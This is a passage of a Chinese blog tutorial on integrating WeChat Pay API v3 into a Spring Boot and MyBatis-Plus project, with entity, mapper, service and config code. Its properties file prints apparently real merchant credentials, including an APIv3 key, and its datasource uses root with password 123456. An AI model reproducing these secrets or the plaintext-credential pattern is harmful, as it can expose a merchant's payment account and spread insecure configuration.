class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;创建时间&#x27;</span>,</span><br><span class="line">  `update_time` datetime <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span> COMMENT <span class="string">&#x27;更新时间&#x27;</span>,</span><br><span class="line">  <span class="keyword">PRIMARY</span> KEY (`id`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB AUTO_INCREMENT<span class="operator">=</span><span class="number">1</span> <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8mb4;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="集成MyBatis-Plus"><a href="#集成MyBatis-Plus" class="headerlink" title="集成MyBatis-Plus"></a>集成MyBatis-Plus</h2><p>引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>配置数据库连接：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务端口</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8090</span></span><br><span class="line"><span class="comment"># 应用名称</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">Wechat-Payment</span></span><br><span class="line">  <span class="attr">jackson:</span></span><br><span class="line">    <span class="attr">date-format:</span> <span class="string">yyyy-MM-dd</span> <span class="string">HH:mm:ss</span></span><br><span class="line">    <span class="attr">time-zone:</span> <span class="string">GMT+8</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/wechat_payment?serverTimezone=GMT%2B8&amp;characterEncoding=utf-8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="number">123456</span></span><br></pre></td></tr></table></figure><hr><h3 id="定义实体类"><a href="#定义实体类" class="headerlink" title="定义实体类"></a>定义实体类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.IdType;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableId;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseEntity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义主键策略：跟随数据库的主键自增</span></span><br><span class="line">    <span class="meta">@TableId(value = &quot;id&quot;, type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> String id; <span class="comment">//主键</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date createTime;<span class="comment">//创建时间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Date updateTime;<span class="comment">//更新时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableName;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@TableName(&quot;t_refund_info&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefundInfo</span> <span class="keyword">extends</span> <span class="title class_">BaseEntity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String orderNo;<span class="comment">//商品订单编号</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String refundNo;<span class="comment">//退款单编号</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String refundId;<span class="comment">//支付系统退款单号</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer totalFee;<span class="comment">//原订单金额(分)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer refund;<span class="comment">//退款金额(分)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String reason;<span class="comment">//退款原因</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String refundStatus;<span class="comment">//退款单状态</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String contentReturn;<span class="comment">//申请退款返回参数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String contentNotify;<span class="comment">//退款结果通知参数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="定义Dao层"><a href="#定义Dao层" class="headerlink" title="定义Dao层"></a>定义Dao层</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.entity.RefundInfo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RefundInfoMapper</span> <span class="keyword">extends</span> <span class="title class_">BaseMapper</span>&lt;RefundInfo&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;top.nanzx.learn_wechatpayment.mapper.RefundInfoMapper&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="定义Service层"><a href="#定义Service层" class="headerlink" title="定义Service层"></a>定义Service层</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.IService;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.entity.RefundInfo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">RefundInfoService</span> <span class="keyword">extends</span> <span class="title class_">IService</span>&lt;RefundInfo&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.extension.service.impl.ServiceImpl;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.entity.RefundInfo;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.mapper.RefundInfoMapper;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.service.RefundInfoService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefundInfoServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;RefundInfoMapper, RefundInfo&gt; <span class="keyword">implements</span> <span class="title class_">RefundInfoService</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="配置Mybatis-Plus的config"><a href="#配置Mybatis-Plus的config" class="headerlink" title="配置Mybatis-Plus的config"></a>配置Mybatis-Plus的config</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.EnableTransactionManagement;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableTransactionManagement</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;top.nanzx.learn_wechatpayment.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MybatisPlusConfig</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>测试：<a href="http://localhost:8090/api/product/list">http://localhost:8090/api/product/list</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.ApiOperation;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.entity.Product;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.service.ProductService;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.vo.R;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Api(tags = &quot;商品管理&quot;)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/product&quot;)</span></span><br><span class="line"><span class="meta">@CrossOrigin</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProductController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ProductService productService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;测试接口&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">R</span>().data(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Hello World&quot;</span>).data(<span class="string">&quot;dataTime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/list&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">list</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;Product&gt; list = productService.list();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">R</span>().data(<span class="string">&quot;productList&quot;</span>, list);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p>一般情况下，java目录下的xml文件不会被打包，所以target里会找不到xml文件，可以在pom.xml中的build标签中添加如下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--打包src/main/java下面的属性文件和xml文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 是否替换资源中的属性--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>false<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--打包src/main/resources目录下的属性文件和xml文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.yml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>添加持久层日志和xml文件位置的配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span> <span class="comment">#sql日志</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br><span class="line"><span class="attr">mapper-locations:</span> <span class="string">classpath:top/nanzx/learn_wechatpayment/mapper/xml/*.xml</span></span><br></pre></td></tr></table></figure><hr><h1 id="基础支付API-v3"><a href="#基础支付API-v3" class="headerlink" title="基础支付API v3"></a>基础支付API v3</h1><blockquote><p>官网开发指引：<a href="https://pay.weixin.qq.com/wiki/doc/apiv3/open/pay/chapter2_7_2.shtml">https://pay.weixin.qq.com/wiki/doc/apiv3/open/pay/chapter2_7_2.shtml</a></p></blockquote><p><strong>APIv3证书与密钥使用说明</strong>：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220113205113.png"></p><h2 id="引入支付参数"><a href="#引入支付参数" class="headerlink" title="引入支付参数"></a>引入支付参数</h2><p>将wxpay.properties 复制到resources目录中【参考1.2  接入指引  获取】：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 微信支付相关参数</span></span><br><span class="line"><span class="comment"># 商户号</span></span><br><span class="line"><span class="attr">wxpay.mch-id</span>=<span class="string">1558950191</span></span><br><span class="line"><span class="comment"># 商户API证书序列号</span></span><br><span class="line"><span class="attr">wxpay.mch-serial-no</span>=<span class="string">34345964330B66427E0D3D28826C4993C77E631F</span></span><br><span class="line"><span class="comment"># 商户私钥文件</span></span><br><span class="line"><span class="attr">wxpay.private-key-path</span>=<span class="string">D:\\javaProjects\\MyLearn\\Learn_WechatPayment\\apiclient_key.pem</span></span><br><span class="line"><span class="comment"># wxpay.private-key-path=apiclient_key.pem</span></span><br><span class="line"><span class="comment"># APIv3密钥</span></span><br><span class="line"><span class="attr">wxpay.api-v3-key</span>=<span class="string">UDuLFDcmy5Eb6o0nTNZdu6ek4DDh4K8B</span></span><br><span class="line"><span class="comment"># APPID</span></span><br><span class="line"><span class="attr">wxpay.appid</span>=<span class="string">wx74862e0dfcf69954</span></span><br><span class="line"><span class="comment"># 微信服务器地址</span></span><br><span class="line"><span class="attr">wxpay.domain</span>=<span class="string">https://api.mch.weixin.qq.com</span></span><br><span class="line"><span class="comment"># 接收结果通知地址</span></span><br><span class="line"><span class="attr">wxpay.notify-domain</span>=<span class="string">https://7d92-115-171-63-135.ngrok.io</span></span><br></pre></td></tr></table></figure><p>配置WxPayConfifig.java读取支付参数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.PropertySource;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:wxpay.properties&quot;)</span> <span class="comment">//读取配置文件</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix=&quot;wxpay&quot;)</span> <span class="comment">//读取wxpay节点</span></span><br><span class="line"><span class="meta">@Data</span> <span class="comment">//使用set方法将wxpay节点中的值填充到当前类的属性中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WxPayConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户号</span></span><br><span class="line">    <span class="keyword">private</span> String mchId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户API证书序列号</span></span><br><span class="line">    <span class="keyword">private</span> String mchSerialNo;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 商户私钥文件</span></span><br><span class="line">    <span class="keyword">private</span> String privateKeyPath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// APIv3密钥</span></span><br><span class="line">    <span class="keyword">private</span> String apiV3Key;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// APPID</span></span><br><span class="line">    <span class="keyword">private</span> String appid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 微信服务器地址</span></span><br><span class="line">    <span class="keyword">private</span> String domain;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 接收结果通知地址</span></span><br><span class="line">    <span class="keyword">private</span> String notifyDomain;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试支付参数的获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.learn_wechatpayment.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.swagger.annotations.Api;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.config.WxPayConfig;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.learn_wechatpayment.vo.R;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Api(tags = &quot;测试控制器&quot;)</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> WxPayConfig wxPayConfig;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/get-wx-pay-config&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> R <span class="title function_">getWxPayConfig</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">mchId</span> <span class="operator">=</span> wxPayConfig.getMchId();</span><br><span class="line">        <span class="keyword">return</span> R.ok().data(<span class="string">&quot;mchId&quot;</span>, mchId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="扩展-1"><a href="#扩展-1" class="headerlink" title="扩展"></a>扩展</h3><ul><li><p>在IDEA中设置 SpringBoot 配置文件，让IDEA可以识别配置文件，将配置文件的图标展示成SpringBoot的图标，同时配置文件的内容可以高亮显示：File -&gt; Project Structure -&gt; Modules -&gt; 展开对应项目文件夹 -&gt; Spring -&gt; 选择小叶子 -&gt; 点击+号选择wxpay.properties</p></li><li><p><strong>配置</strong> <strong>Annotation Processor</strong>可以帮助我们生成自定义配置的元数据信息，让配置文件和Java代码之间的对应参数可以自动定位（ctrl+鼠标左键），方便开发。</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-configuration-processor<span class="tag">&lt;/<span 